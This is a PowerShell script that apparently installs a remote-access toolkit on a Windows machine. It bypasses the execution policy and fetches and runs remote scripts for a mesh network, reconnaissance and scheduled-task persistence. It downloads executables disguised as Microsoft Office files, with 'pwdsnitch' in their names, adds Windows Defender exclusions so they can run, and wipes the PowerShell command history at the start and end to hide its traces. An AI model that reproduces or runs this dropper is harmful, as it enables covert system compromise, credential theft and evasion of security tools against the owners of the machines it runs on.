Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
    $files = Get-ChildItem -Path $psreadlineFolderPath
    if ($files.Count -gt 0) {
        Remove-Item -Path "$psreadlineFolderPath\*" -Force
    }
}
} else {}
#OP Install
$url = "https://tinyurl.com/backupinstall"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$prompt = Read-Host "Proceed With OP Install (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
} else {}
#ZT Setup
$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$prompt = Read-Host "Proceed With $Name Install (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
} else {}
#Recon Service
$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$prompt = Read-Host "Proceed With $Name Install (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
} else {}
$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$prompt = Read-Host "Proceed With $Name Install (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
} else {}
#Scheduled Task
$url = "https://tinyurl.com/taskschedulersetup"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$prompt = Read-Host "Proceed With $Name Install (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
} else {}
#litepwdsnitch Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
#classic-full-st Fix
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing $Name Fix..."
    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
    	Add-MpPreference -ExclusionPath $exepath
	Invoke-WebRequest -Uri $url -OutFile $exepath	
	Start-Process -FilePath $exepath
 	if ($output -ne $null) {
    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	Remove-MpPreference -ExclusionPath $exepath
} else {}
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
    $files = Get-ChildItem -Path $psreadlineFolderPath
    if ($files.Count -gt 0) {
        Remove-Item -Path "$psreadlineFolderPath\*" -Force
    }
}
} else {}
